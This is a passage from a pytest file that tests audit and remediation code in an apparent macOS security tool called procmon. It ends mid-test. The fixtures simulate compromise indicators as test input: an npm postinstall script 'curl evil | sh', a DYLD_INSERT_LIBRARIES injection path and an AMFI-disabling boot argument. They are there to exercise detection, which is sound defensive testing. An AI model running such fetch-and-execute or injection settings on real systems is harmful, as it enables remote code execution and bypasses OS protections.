"""Extra tests aimed at raising procmon.py coverage toward 95%.

Organised by the gaps identified in the coverage report:
1. Dispatch-action branches (every remediation action type)
2. CLI main() paths (--audit, --capture-baseline)
3. Audit parser internals + edge cases
4. Render paths + cursor overlay + rescanning suffix
5. Rule engine variants
6. Small helpers (_quarantine_file, Firefox parser, TCC sqlite, etc.)
"""
import os
import io
import json
import stat
import sqlite3
import sys
import subprocess
import threading
import time
from contextlib import redirect_stdout
from unittest.mock import MagicMock, patch, call

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import procmon


# ── Helpers ────────────────────────────────────────────────────────────────


@pytest.fixture
def log_ready(monitor):
    """Install the logger bits a dispatch call touches."""
    monitor._log_messages = []
    monitor._log_lock = threading.Lock()
    monitor._log_max = 100
    return monitor


# ── 1. Dispatch action branches ────────────────────────────────────────────


class TestDispatchAuditActionBranches:
    def test_enable_alf_stealth(self, log_ready):
        with patch.object(procmon, "_run_cmd_short",
                          return_value=(0, "on", "")) as run:
            ok, _ = log_ready._dispatch_audit_action(
                {"type": "enable_alf_stealth"})
        assert ok is True
        assert "setstealthmode" in run.call_args[0][0][1]

    def test_disable_remote_login(self, log_ready):
        with patch.object(procmon, "_run_cmd_short",
                          return_value=(0, "", "")) as run:
            ok, _ = log_ready._dispatch_audit_action(
                {"type": "disable_remote_login"})
        assert ok is True
        assert run.call_args[0][0] == [
            "systemsetup", "-setremotelogin", "off"]

    def test_disable_sharing_service_success(self, log_ready):
        with patch.object(procmon, "_run_cmd_short",
                          return_value=(0, "", "")) as run:
            ok, _ = log_ready._dispatch_audit_action(
                {"type": "disable_sharing_service",
                 "service": "com.apple.screensharing"})
        assert ok is True
        assert "system/com.apple.screensharing" in run.call_args[0][0]

    def test_disable_sharing_service_missing_name(self, log_ready):
        ok, msg = log_ready._dispatch_audit_action(
            {"type": "disable_sharing_service"})
        assert ok is False
        assert "missing service" in msg

    def test_remove_profile_success(self, log_ready):
        with patch.object(procmon, "_run_cmd_short",
                          return_value=(0, "", "")) as run:
            ok, _ = log_ready._dispatch_audit_action(
                {"type": "remove_profile", "identifier": "com.mdm.bad"})
        assert ok is True
        assert "com.mdm.bad" in run.call_args[0][0]

    def test_flush_dns_success(self, log_ready):
        calls = []
        def fake(argv, **_):
            calls.append(argv)
            return (0, "", "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake):
            ok, msg = log_ready._dispatch_audit_action({"type": "flush_dns"})
        assert ok is True
        assert any("dscacheutil" in c[0] for c in calls)
        assert any("mDNSResponder" in " ".join(c) for c in calls)

    def test_flush_dns_partial_failure(self, log_ready):
        def fake(argv, **_):
            if argv[0] == "dscacheutil":
                return (0, "", "")
            return (1, "", "oops")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake):
            ok, _ = log_ready._dispatch_audit_action({"type": "flush_dns"})
        assert ok is False

    def test_bootout_launchitem_plist_missing(self, log_ready):
        ok, msg = log_ready._dispatch_audit_action(
            {"type": "bootout_launchitem",
             "plist_path": "/nonexistent/plist",
             "domain": "system"})
        assert ok is False
        assert "not found" in msg

    def test_bootout_launchitem_happy(self, log_ready, tmp_path, monkeypatch):
        plist = tmp_path / "com.evil.plist"
        plist.write_text("<plist/>\n")
        monkeypatch.setattr(procmon, "_QUARANTINE_DIR",
                             str(tmp_path / "quarantine"))
        with patch.object(procmon, "_run_cmd_short",
                          return_value=(0, "", "")):
            ok, msg = log_ready._dispatch_audit_action(
                {"type": "bootout_launchitem",
                 "plist_path": str(plist),
                 "domain": "system",
                 "label": "com.evil"})
        assert ok is True
        assert not plist.exists()
        # Quarantined file exists under the tmp quarantine dir
        qd = list((tmp_path / "quarantine").iterdir())
        assert len(qd) == 1

    def test_bootout_launchitem_gui_and_user_domains(self, log_ready, tmp_path,
                                                    monkeypatch):
        monkeypatch.setattr(procmon, "_QUARANTINE_DIR",
                             str(tmp_path / "q"))
        for domain in ("gui", "user"):
            plist = tmp_path / f"{domain}.plist"
            plist.write_text("<plist/>\n")
            calls = []
            def fake(argv, **_):
                calls.append(argv)
                return (0, "", "")
            with patch.object(procmon, "_run_cmd_short", side_effect=fake):
                ok, _ = log_ready._dispatch_audit_action(
                    {"type": "bootout_launchitem",
                     "plist_path": str(plist),
                     "domain": domain,
                     "label": "x"})
            assert ok is True
            # Domain arg got formatted as `<domain>/<uid>`
            assert any(f"{domain}/{os.getuid()}" in " ".join(c)
                       for c in calls)

    def test_quarantine_plist_action(self, log_ready, tmp_path, monkeypatch):
        monkeypatch.setattr(procmon, "_QUARANTINE_DIR",
                             str(tmp_path / "q"))
        target = tmp_path / "spy.plist"
        target.write_text("x")
        ok, _ = log_ready._dispatch_audit_action(
            {"type": "quarantine_plist", "plist_path": str(target)})
        assert ok is True
        assert not target.exists()

    def test_restore_hosts_missing(self, log_ready, monkeypatch):
        # Patch the action to target a non-existent hosts file path via
        # a dedicated tmp dir — simulates "no /etc/hosts".
        with patch("os.path.exists", return_value=False):
            ok, msg = log_ready._dispatch_audit_action(
                {"type": "restore_hosts"})
        assert ok is False

    def test_run_software_update_success(self, log_ready):
        with patch.object(procmon, "_run_cmd_short",
                          return_value=(0, "Done.", "")) as run:
            ok, _ = log_ready._dispatch_audit_action(
                {"type": "run_software_update"})
        assert ok is True
        assert "softwareupdate" == run.call_args[0][0][0]

    def test_run_software_update_failure_is_flagged(self, log_ready):
        with patch.object(procmon, "_run_cmd_short",
                          return_value=(1, "", "permission denied")):
            ok, _ = log_ready._dispatch_audit_action(
                {"type": "run_software_update"})
        assert ok is False

    def test_delegates_kill_process_to_keyscan_dispatcher(self, log_ready):
        with patch.object(log_ready, "_dispatch_keyscan_action",
                          return_value=(True, "ok")) as dispatch:
            ok, _ = log_ready._dispatch_audit_action(
                {"type": "kill_process", "pid": 42})
        dispatch.assert_called_once()
        assert ok is True


class TestQuarantineFile:
    def test_file_not_found(self, log_ready):
        ok, msg = log_ready._quarantine_file("/nonexistent")
        assert ok is False
        assert "not found" in msg

    def test_empty_path(self, log_ready):
        ok, msg = log_ready._quarantine_file("")
        assert ok is False

    def test_happy_path_moves_file(self, log_ready, tmp_path, monkeypatch):
        src = tmp_path / "victim"
        src.write_text("x")
        monkeypatch.setattr(procmon, "_QUARANTINE_DIR",
                             str(tmp_path / "q"))
        ok, msg = log_ready._quarantine_file(str(src))
        assert ok is True
        assert "moved to" in msg
        assert not src.exists()


# ── 2. CLI main() paths (--audit, --capture-baseline) ──────────────────────


class TestCliAuditFlag:
    def _run_main(self, argv, monkeypatch):
        """Invoke procmon.main() with argv + capture stdout."""
        monkeypatch.setattr(sys, "argv", argv)
        # Audit/baseline exits before curses.wrapper is ever touched,
        # but guard anyway so a bug doesn't hang the suite.
        buf = io.StringIO()
        with redirect_stdout(buf), \
             patch.object(procmon, "_preflight", return_value=True), \
             patch.object(procmon, "_self_test", return_value=True), \
             patch.object(procmon, "_harden_process"):
            with pytest.raises(SystemExit) as exc:
                procmon.main()
        return exc.value.code, buf.getvalue()

    def test_audit_unknown_name_exits_with_error(self, monkeypatch):
        code, out = self._run_main(
            ["procmon", "--audit", "banana"], monkeypatch)
        assert code == 2
        assert "unknown audit" in out

    def test_audit_prints_summary_and_findings(self, monkeypatch):
        fake = [
            {"severity": "HIGH", "message": "bad",
             "evidence": "because reason",
             "action": {"type": "enable_alf"}},
            {"severity": "OK", "message": "clean", "action": None},
        ]
        monkeypatch.setattr(procmon, "_audit_network_exposure",
                             lambda: fake)
        code, out = self._run_main(
            ["procmon", "--audit", "network"], monkeypatch)
        assert code == 0
        # Title, severity bar, findings, details — every section present
        assert "NETWORK" in out
        assert "[HIGH 1]" in out
        assert "[OK 1]" in out
        assert "Actionable:  1" in out
        assert "FINDINGS" in out
        assert "1. [*]" in out
        assert "bad" in out
        # Details section rendered because evidence exists
        assert "DETAILS" in out
        assert "because reason" in out
        assert "enable_alf" in out

    def test_audit_without_evidence_skips_details_section(self, monkeypatch):
        monkeypatch.setattr(
            procmon, "_audit_network_exposure",
            lambda: [{"severity": "OK", "message": "ok", "action": None}])
        code, out = self._run_main(
            ["procmon", "--audit", "network"], monkeypatch)
        assert code == 0
        assert "FINDINGS" in out
        assert "DETAILS" not in out  # no evidence/action on the lone OK row

    def test_capture_baseline_writes_file(self, tmp_path, monkeypatch):
        baseline = tmp_path / "baseline.json"
        monkeypatch.setattr(procmon, "_BASELINE_PATH", str(baseline))
        # Mock all the collector helpers so we don't touch the real host
        monkeypatch.setattr(procmon, "_enumerate_launch_items",
                             lambda: [])
        monkeypatch.setattr(procmon, "_list_system_extensions",
                             lambda: [])
        monkeypatch.setattr(procmon, "_list_listening_sockets",
                             lambda: [])
        monkeypatch.setattr(procmon, "_list_config_profiles",
                             lambda: [])
        monkeypatch.setattr(procmon, "_sharing_services_state",
                             lambda: {"remote_login": False})
        code, out = self._run_main(
            ["procmon", "--capture-baseline"], monkeypatch)
        assert code == 0
        assert "wrote" in out
        assert baseline.exists()

    def test_capture_baseline_save_failure_nonzero(self, monkeypatch):
        monkeypatch.setattr(procmon, "_BASELINE_PATH", "/nope/x.json")
        monkeypatch.setattr(procmon, "_enumerate_launch_items",
                             lambda: [])
        monkeypatch.setattr(procmon, "_list_system_extensions",
                             lambda: [])
        monkeypatch.setattr(procmon, "_list_listening_sockets",
                             lambda: [])
        monkeypatch.setattr(procmon, "_list_config_profiles",
                             lambda: [])
        monkeypatch.setattr(procmon, "_sharing_services_state",
                             lambda: {})
        code, out = self._run_main(
            ["procmon", "--capture-baseline"], monkeypatch)
        assert code == 1
        assert "failed" in out.lower()

    def test_negative_interval_rejected(self, monkeypatch):
        monkeypatch.setattr(sys, "argv", ["procmon", "-i", "-1"])
        with pytest.raises(SystemExit):
            procmon.main()


# ── 3. Audit parser internals + edge cases ─────────────────────────────────


class TestQueryTccAllRisky:
    def _make_tcc_db(self, path):
        """Create a minimal TCC-like sqlite schema + row."""
        conn = sqlite3.connect(str(path))
        try:
            conn.execute(
                "CREATE TABLE access ("
                "service TEXT, client TEXT, client_type INT, "
                "auth_value INT, auth_reason INT, last_modified INT)")
            conn.execute(
                "INSERT INTO access VALUES "
                "('kTCCServiceSystemPolicyAllFiles', 'com.evil', 0, 2, 3, 0)")
            conn.commit()
        finally:
            conn.close()

    def test_reads_real_sqlite(self, tmp_path, monkeypatch):
        db = tmp_path / "TCC.db"
        self._make_tcc_db(db)
        monkeypatch.setattr(procmon, "_TCC_SYSTEM_DB", str(db))
        monkeypatch.setattr(procmon, "_EFFECTIVE_HOME", str(tmp_path))
        entries = procmon._query_tcc_all_risky()
        assert len(entries) == 1
        assert entries[0]["client"] == "com.evil"

    def test_missing_db_returns_empty(self, tmp_path, monkeypatch):
        monkeypatch.setattr(procmon, "_TCC_SYSTEM_DB",
                             str(tmp_path / "missing"))
        monkeypatch.setattr(procmon, "_EFFECTIVE_HOME", str(tmp_path))
        entries = procmon._query_tcc_all_risky()
        assert entries == []

    def test_broken_db_skipped(self, tmp_path, monkeypatch):
        db = tmp_path / "TCC.db"
        db.write_text("not sqlite at all")
        monkeypatch.setattr(procmon, "_TCC_SYSTEM_DB", str(db))
        monkeypatch.setattr(procmon, "_EFFECTIVE_HOME", str(tmp_path))
        # Should NOT raise; broken DB returns empty
        entries = procmon._query_tcc_all_risky()
        assert entries == []


class TestFirefoxExtensions:
    def test_lists_non_theme_addons(self, tmp_path, monkeypatch):
        profile = tmp_path / "Library/Application Support/Firefox/Profiles/x"
        profile.mkdir(parents=True)
        (profile / "extensions.json").write_text(json.dumps({
            "addons": [
                {"id": "tracker@evil",
                 "defaultLocale": {"name": "EvilTracker"},
                 "userPermissions": {"permissions": ["<all_urls>"]},
                 "path": str(profile / "ext1")},
                {"id": "theme@pretty", "type": "theme"},
            ]
        }))
        monkeypatch.setattr(procmon, "_EFFECTIVE_HOME", str(tmp_path))
        exts = procmon._enum_firefox_extensions()
        names = {e["name"] for e in exts}
        assert "EvilTracker" in names
        assert "theme@pretty" not in {e["id"] for e in exts}

    def test_no_firefox_dir_returns_empty(self, tmp_path, monkeypatch):
        monkeypatch.setattr(procmon, "_EFFECTIVE_HOME", str(tmp_path))
        assert procmon._enum_firefox_extensions() == []

    def test_broken_extensions_json_skipped(self, tmp_path, monkeypatch):
        profile = tmp_path / "Library/Application Support/Firefox/Profiles/x"
        profile.mkdir(parents=True)
        (profile / "extensions.json").write_text("{not-json")
        monkeypatch.setattr(procmon, "_EFFECTIVE_HOME", str(tmp_path))
        assert procmon._enum_firefox_extensions() == []


class TestAuditProcessEntitlementsBranches:
    def _mk_cs(self, ent_keys, team="TEAMID", hr=True):
        """Build a _codesign_structured-like dict with an entitlements blob."""
        ent_xml = (
            "<?xml version='1.0' encoding='UTF-8'?>\n"
            "<!DOCTYPE plist><plist version='1.0'><dict>\n"
            + "".join(f"<key>{k}</key><true/>\n" for k in ent_keys)
            + "</dict></plist>\n"
        )
        return {"rc": 0, "team_id": team, "authority": ["Developer ID"],
                "entitlements_xml": ent_xml, "hardened_runtime": hr}

    def test_dyld_env_plus_live_is_critical(self, monkeypatch):
        monkeypatch.setattr(procmon, "_list_all_pids", lambda: [1234])
        monkeypatch.setattr(procmon, "_get_proc_path", lambda _p: "/Applications/X")
        monkeypatch.setattr(procmon, "_codesign_structured",
                             lambda _: self._mk_cs(
                                 ["com.apple.security.cs.allow-dyld-environment-variables"]))
        monkeypatch.setattr(procmon, "_is_apple_signed",
                             lambda *a, **k: False)
        monkeypatch.setattr(procmon, "_get_proc_env",
                             lambda _: {"DYLD_INSERT_LIBRARIES": "/evil.dylib"})
        with patch("os.path.exists", return_value=True):
            findings = procmon._audit_process_entitlements()
        assert any(f["severity"] == "CRITICAL" for f in findings)

    def test_get_task_allow_only_is_high(self, monkeypatch):
        monkeypatch.setattr(procmon, "_list_all_pids", lambda: [1234])
        monkeypatch.setattr(procmon, "_get_proc_path", lambda _p: "/Applications/X")
        monkeypatch.setattr(procmon, "_codesign_structured",
                             lambda _: self._mk_cs(
                                 ["com.apple.security.get-task-allow"]))
        monkeypatch.setattr(procmon, "_is_apple_signed",
                             lambda *a, **k: False)
        monkeypatch.setattr(procmon, "_get_proc_env", lambda _: {})
        with patch("os.path.exists", return_value=True):
            findings = procmon._audit_process_entitlements()
        assert any(f["severity"] == "HIGH"
                   and "get-task-allow" in f["message"]
                   for f in findings)

    def test_library_validation_plus_dyld_is_critical(self, monkeypatch):
        monkeypatch.setattr(procmon, "_list_all_pids", lambda: [1234])
        monkeypatch.setattr(procmon, "_get_proc_path", lambda _p: "/Applications/X")
        monkeypatch.setattr(procmon, "_codesign_structured",
                             lambda _: self._mk_cs(
                                 ["com.apple.security.cs.disable-library-validation"]))
        monkeypatch.setattr(procmon, "_is_apple_signed",
                             lambda *a, **k: False)
        monkeypatch.setattr(procmon, "_get_proc_env",
                             lambda _: {"DYLD_INSERT_LIBRARIES": "/evil"})
        with patch("os.path.exists", return_value=True):
            findings = procmon._audit_process_entitlements()
        assert any(f["severity"] == "CRITICAL" for f in findings)

    def test_translocated_app_is_medium(self, monkeypatch):
        monkeypatch.setattr(procmon, "_list_all_pids", lambda: [1234])
        monkeypatch.setattr(
            procmon, "_get_proc_path",
            lambda _p: "/private/var/folders/xx/AppTranslocation/abc/d/X")
        monkeypatch.setattr(procmon, "_codesign_structured",
                             lambda _: self._mk_cs([]))
        monkeypatch.setattr(procmon, "_is_apple_signed",
                             lambda *a, **k: False)
        monkeypatch.setattr(procmon, "_get_proc_env", lambda _: {})
        with patch("os.path.exists", return_value=True):
            findings = procmon._audit_process_entitlements()
        assert any(f["severity"] == "MEDIUM" for f in findings)

    def test_apple_signed_is_skipped(self, monkeypatch):
        monkeypatch.setattr(procmon, "_list_all_pids", lambda: [1])
        monkeypatch.setattr(procmon, "_get_proc_path",
                             lambda _p: "/System/Library/X")
        monkeypatch.setattr(procmon, "_codesign_structured",
                             lambda _: self._mk_cs(
                                 ["com.apple.security.get-task-allow"]))
        monkeypatch.setattr(procmon, "_is_apple_signed",
                             lambda *a, **k: True)
        with patch("os.path.exists", return_value=True):
            findings = procmon._audit_process_entitlements()
        # All findings are OK — dangerous entitlements on Apple binaries
        # are intentional (eg. dyld itself).
        assert all(f["severity"] == "OK" for f in findings)


class TestAuditSystemHardeningBranches:
    def _fake(self, **overrides):
        """Build a _run_cmd_short mock that returns plausible outputs."""
        defaults = {
            "csrutil_status": "System Integrity Protection: enabled.",
            "csrutil_root": "Authenticated Root status: enabled",
            "spctl_status": "assessments enabled",
            "fdesetup": "FileVault is On.",
            "bputil": "",
            "profiles_enrollment": "MDM enrollment: No",
            "sysadminctl": "",
        }
        defaults.update(overrides)
        def run(argv, **_):
            cmd = argv[0] if argv else ""
            if cmd == "csrutil" and "authenticated-root" in argv:
                return (0, defaults["csrutil_root"], "")
            if cmd == "csrutil":
                return (0, defaults["csrutil_status"], "")
            if cmd == "spctl":
                return (0, defaults["spctl_status"], "")
            if cmd == "fdesetup":
                return (0, defaults["fdesetup"], "")
            if cmd == "bputil":
                return (0, "", defaults["bputil"])
            if cmd == "profiles":
                return (0, defaults["profiles_enrollment"], "")
            if cmd == "sysadminctl":
                return (0, defaults["sysadminctl"], "")
            return (0, "", "")
        return run

    def test_gatekeeper_disabled(self, monkeypatch):
        with patch.object(procmon, "_run_cmd_short",
                          side_effect=self._fake(spctl_status="assessments disabled")):
            with patch.object(procmon, "_read_plist_defaults", return_value={}), \
                 patch("os.path.exists", return_value=False):
                findings = procmon._audit_system_hardening()
        assert any(f["severity"] == "HIGH"
                   and "Gatekeeper" in f["message"]
                   for f in findings)

    def test_ssv_disabled(self, monkeypatch):
        with patch.object(procmon, "_run_cmd_short",
                          side_effect=self._fake(
                              csrutil_root="Authenticated Root status: disabled")):
            with patch.object(procmon, "_read_plist_defaults", return_value={}), \
                 patch("os.path.exists", return_value=False):
                findings = procmon._audit_system_hardening()
        assert any(f["severity"] == "CRITICAL"
                   and "SSV" in f["message"]
                   for f in findings)

    def test_secure_boot_permissive_is_critical(self, monkeypatch):
        with patch.object(procmon, "_run_cmd_short",
                          side_effect=self._fake(bputil="Permissive Security")):
            with patch.object(procmon, "_read_plist_defaults", return_value={}), \
                 patch("os.path.exists", return_value=False):
                findings = procmon._audit_system_hardening()
        assert any(f["severity"] == "CRITICAL"
                   and "Permissive" in f["message"]
                   for f in findings)

    def test_secure_boot_reduced_is_medium(self, monkeypatch):
        with patch.object(procmon, "_run_cmd_short",
                          side_effect=self._fake(bputil="Reduced Security")):
            with patch.object(procmon, "_read_plist_defaults", return_value={}), \
                 patch("os.path.exists", return_value=False):
                findings = procmon._audit_system_hardening()
        assert any(f["severity"] == "MEDIUM" for f in findings)

    def test_lockdown_mode_enabled_surfaces_info(self, monkeypatch):
        with patch.object(procmon, "_run_cmd_short",
                          side_effect=self._fake()), \
             patch.object(procmon, "_read_plist_defaults",
                          return_value={"LockdownModeEnabled": True}), \
             patch("os.path.exists", return_value=False):
            findings = procmon._audit_system_hardening()
        assert any("Lockdown Mode" in f["message"] for f in findings)


class TestAuditKernelBootBranches:
    def test_suspicious_boot_args_are_high(self, monkeypatch):
        def fake(argv, **_):
            cmd = argv[0] if argv else ""
            if cmd == "kmutil":
                return (0, "", "")
            if cmd == "nvram":
                return (0, "boot-args\tamfi_get_out_of_my_way=1", "")
            if cmd == "diskutil":
                return (0, "", "")
            if cmd.endswith("eficheck"):
                return (None, "", "")
            return (0, "", "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake), \
             patch.object(procmon, "_list_system_extensions", return_value=[]), \
             patch("os.path.isdir", return_value=False):
            findings = procmon._audit_kernel_boot()
        assert any(f["severity"] == "HIGH"
                   and "boot-args" in f["message"]
                   for f in findings)

    def test_pending_sysext_is_high(self, monkeypatch):
        fake_exts = [{"team_id": "AAAA", "bundle_id": "com.x",
                      "state": "activated waiting for user"}]
        with patch.object(procmon, "_run_cmd_short",
                          return_value=(0, "", "")), \
             patch.object(procmon, "_list_system_extensions",
                          return_value=fake_exts), \
             patch("os.path.isdir", return_value=False):
            findings = procmon._audit_kernel_boot()
        assert any(f["severity"] == "HIGH"
                   and "pending activation" in f["message"]
                   for f in findings)

    def test_non_apple_kexts_under_library_extensions(self, monkeypatch,
                                                     tmp_path):
        root = tmp_path / "Extensions"
        root.mkdir()
        (root / "Evil.kext").mkdir()

        real_isdir = os.path.isdir
        def fake_isdir(p):
            if p == "/Library/Extensions":
                return True
            return real_isdir(p)
        real_listdir = os.listdir
        def fake_listdir(p):
            if p == "/Library/Extensions":
                return ["Evil.kext"]
            return real_listdir(p)

        with patch.object(procmon, "_run_cmd_short",
                          return_value=(0, "", "")), \
             patch.object(procmon, "_list_system_extensions", return_value=[]), \
             patch.object(procmon, "_codesign_structured", return_value={}), \
             patch.object(procmon, "_is_apple_signed", return_value=False), \
             patch("os.path.isdir", side_effect=fake_isdir), \
             patch("os.listdir", side_effect=fake_listdir):
            findings = procmon._audit_kernel_boot()
        assert any(f["severity"] == "HIGH"
                   and "non-Apple kext" in f["message"]
                   for f in findings)


class TestAuditPatchPostureBranches:
    def test_no_pending_updates_is_ok(self, monkeypatch):
        def fake(argv, **_):
            if "-productVersion" in argv:
                return (0, "15.2", "")
            if "-buildVersion" in argv:
                return (0, "24C101", "")
            if argv[0] == "softwareupdate":
                return (0, "Software Update Tool\nNo new software available.", "")
            return (0, "", "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake), \
             patch.object(procmon, "_read_plist_defaults", return_value={}):
            findings = procmon._audit_patch_posture()
        assert any("no pending updates" in f["message"].lower()
                   for f in findings)

    def test_pending_updates_flagged_high(self, monkeypatch):
        def fake(argv, **_):
            if "-productVersion" in argv:
                return (0, "15.2", "")
            if "-buildVersion" in argv:
                return (0, "24C101", "")
            if argv[0] == "softwareupdate":
                return (0, "* Label: macOS 15.3\n"
                           "  Title: macOS 15.3, recommended: YES", "")
            return (0, "", "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake), \
             patch.object(procmon, "_read_plist_defaults", return_value={}):
            findings = procmon._audit_patch_posture()
        assert any(f["severity"] == "HIGH"
                   and "pending" in f["message"]
                   for f in findings)

    def test_disabled_update_prefs_flagged(self, monkeypatch):
        def fake(argv, **_):
            if "-productVersion" in argv:
                return (0, "15.2", "")
            if "-buildVersion" in argv:
                return (0, "24C101", "")
            return (0, "No new software available.", "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake), \
             patch.object(procmon, "_read_plist_defaults",
                          return_value={"ConfigDataInstall": 0,
                                        "CriticalUpdateInstall": False}):
            findings = procmon._audit_patch_posture()
        assert any("ConfigDataInstall" in f["message"]
                   or "XProtect" in f["message"]
                   for f in findings)


class TestAuditInstalledSoftwareBranches:
    def test_disable_library_validation_is_flagged(self, tmp_path,
                                                   monkeypatch):
        app = tmp_path / "X.app"
        app.mkdir()
        ent_xml = ('<?xml version="1.0"?>\n<plist><dict>'
                   '<key>com.apple.security.cs.disable-library-validation</key>'
                   '<true/></dict></plist>')
        with patch.object(procmon, "_iter_app_bundles",
                          return_value=[str(app)]), \
             patch.object(procmon, "_codesign_structured",
                          return_value={"rc": 0, "team_id": "T",
                                        "authority": ["Developer ID"],
                                        "entitlements_xml": ent_xml,
                                        "hardened_runtime": True}), \
             patch.object(procmon, "_is_apple_signed", return_value=False):
            findings = procmon._audit_installed_software()
        assert any("disable-library-validation" in f["message"]
                   for f in findings)

    def test_translocated_app_is_high(self, monkeypatch):
        tr_path = ("/private/var/folders/xx/AppTranslocation/abc/d/Y.app")
        with patch.object(procmon, "_iter_app_bundles",
                          return_value=[tr_path]), \
             patch.object(procmon, "_codesign_structured",
                          return_value={"rc": 0, "team_id": "T",
                                        "authority": ["Developer ID"],
                                        "entitlements_xml": "",
                                        "hardened_runtime": True}), \
             patch.object(procmon, "_is_apple_signed", return_value=False):
            findings = procmon._audit_installed_software()
        assert any(f["severity"] == "HIGH"
                   and "translocat" in f["message"]
                   for f in findings)


class TestAuditFilesystemIntegrity:
    def test_authorizationdb_weakened_surfaces_high(self, monkeypatch,
                                                   tmp_path):
        # Point sensitive-files list at a harmless tmp file so we don't
        # light up CRITICAL cards about /etc/hosts on the host.
        safe = tmp_path / "safe"
        safe.write_text("")
        os.chmod(safe, 0o644)
        monkeypatch.setattr(
            procmon, "_FS_SENSITIVE_FILES",
            [(str(safe), 0o644, "root", "wheel")])

        def fake(argv, **_):
            if argv[0] == "security" and "authorizationdb" in argv:
                return (0, "<key>rule</key><string>allow</string>", "")
            if argv[0] == "find":
                return (0, "", "")
            return (0, "", "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake):
            findings = procmon._audit_filesystem_integrity()
        assert any(f["severity"] == "HIGH"
                   and "AuthorizationDB" in f["message"]
                   for f in findings)


class TestAuditKeychainBranches:
    def test_system_keychain_wrong_owner_surfaces_critical(self, tmp_path,
                                                           monkeypatch):
        kc = tmp_path / "System.keychain"
        kc.write_bytes(b"\x00")
        os.chmod(kc, 0o666)  # writable by non-root path — we claim owner is us
        def fake(argv, **_):
            cmd = argv[0] if argv else ""
            if cmd == "security" and "system" in argv:
                return (0, f'"{kc}"\n', "")
            if cmd == "fdesetup":
                return (0, "alex, UUID\n", "")
            if cmd == "dscl":
                return (0, "alex\n", "")
            if cmd == "sysadminctl":
                return (0, "", "Secure Token: ENABLED\n")
            return (0, "", "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake):
            findings = procmon._audit_keychain_credentials()
        # System keychain with group/world-write bit set by non-root owner
        assert any(f["severity"] == "CRITICAL"
                   and "System keychain" in f["message"]
                   for f in findings)

    def test_no_secure_token_flags_filevault(self, monkeypatch):
        def fake(argv, **_):
            cmd = argv[0] if argv else ""
            if cmd == "security":
                return (0, "", "")
            if cmd == "fdesetup":
                return (0, "", "")
            if cmd == "dscl":
                return (0, "alex\nbob\n", "")
            if cmd == "sysadminctl":
                return (0, "", "Secure Token: DISABLED")
            return (0, "", "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake):
            findings = procmon._audit_keychain_credentials()
        assert any(f["severity"] == "HIGH"
                   and "Secure Token" in f["message"]
                   for f in findings)


class TestAuditAuthStackBranches:
    def test_weakened_authorizationdb_flagged(self, monkeypatch, tmp_path):
        monkeypatch.setattr(procmon, "_AUTH_PLUGIN_ROOTS", [])
        monkeypatch.setattr(procmon, "_PAM_DIR", str(tmp_path / "nope"))
        def fake(argv, **_):
            if argv[0] == "security" and "authorizationdb" in argv:
                return (0, "<string>allow</string>", "")
            return (0, "", "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake):
            findings = procmon._audit_authentication_stack()
        assert any(f["severity"] == "HIGH"
                   and "AuthorizationDB" in f["message"]
                   for f in findings)

    def test_recent_pam_mod_surfaces_medium(self, tmp_path, monkeypatch):
        monkeypatch.setattr(procmon, "_AUTH_PLUGIN_ROOTS", [])
        pam_dir = tmp_path / "pam"
        pam_dir.mkdir()
        (pam_dir / "login").write_text("auth ...")
        monkeypatch.setattr(procmon, "_PAM_DIR", str(pam_dir))
        def fake(argv, **_):
            return (1, "", "")  # authdb reads fail -> skipped
        with patch.object(procmon, "_run_cmd_short", side_effect=fake):
            findings = procmon._audit_authentication_stack()
        assert any(f["severity"] == "MEDIUM"
                   and "PAM" in f["message"]
                   for f in findings)

    def test_signed_third_party_plugin_medium(self, tmp_path, monkeypatch):
        monkeypatch.setattr(procmon, "_AUTH_PLUGIN_ROOTS", [str(tmp_path)])
        monkeypatch.setattr(procmon, "_PAM_DIR", str(tmp_path / "nope"))
        (tmp_path / "Jamf.bundle").mkdir()
        def fake(argv, **_):
            return (1, "", "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake), \
             patch.object(procmon, "_codesign_structured",
                          return_value={"rc": 0, "team_id": "JAMFID",
                                        "authority": ["Developer ID"]}), \
             patch.object(procmon, "_is_apple_signed", return_value=False):
            findings = procmon._audit_authentication_stack()
        assert any(f["severity"] == "MEDIUM"
                   and "Third-party auth plugin" in f["message"]
                   for f in findings)


class TestAuditPackagesBranches:
    def test_typosquat_npm_global_flagged(self, tmp_path, monkeypatch):
        # Fake npm prefix + one typosquat package
        npm_root = tmp_path / "npm_root"
        npm_root.mkdir()
        pkg = npm_root / "colors-js"
        pkg.mkdir()
        (pkg / "package.json").write_text(json.dumps({
            "name": "colors-js",
            "scripts": {"postinstall": "curl evil | sh"},
        }))

        def fake(argv, **_):
            if argv[0] == "npm" and "root" in argv:
                return (0, str(npm_root), "")
            return (1, "", "")
        monkeypatch.setattr(procmon, "_EFFECTIVE_HOME", str(tmp_path))
        with patch.object(procmon, "_run_cmd_short", side_effect=fake):
            findings = procmon._audit_package_managers()
        assert any(f["severity"] == "HIGH"
                   and "colors-js" in f["message"]
                   for f in findings)

    def test_brew_count_surfaced(self, tmp_path, monkeypatch):
        def fake(argv, **_):
            if argv[0] == "brew":
                return (0, "foo 1.0\nbar 2.0\nbaz 3.0\n", "")
            return (1, "", "")
        monkeypatch.setattr(procmon, "_EFFECTIVE_HOME", str(tmp_path))
        with patch.object(procmon, "_run_cmd_short", side_effect=fake):
            findings = procmon._audit_package_managers()
        assert any("Homebrew" in f["message"] and "3" in f["message"]
                   for f in findings)

# ── 4. Render paths + cursor overlay + rescanning suffix ───────────────────


class TestAuditRenderPaths:
    def _setup(self, monitor):
        """Prepare a minimal render context."""
        from tests.conftest import make_proc
        monitor.stdscr.getmaxyx.return_value = (40, 140)
        # render() short-circuits on empty rows — provide a dummy row
        monitor.rows = [make_proc(pid=1, command="/bin/test")]
        monitor.selected = 0
        monitor._detail_focus = True

    def test_loading_state_shows_running(self, monitor):
        self._setup(monitor)
        monitor._audit_mode = True
        monitor._audit_type = "network"
        monitor._audit_loading = True
        monitor._audit_lines = []
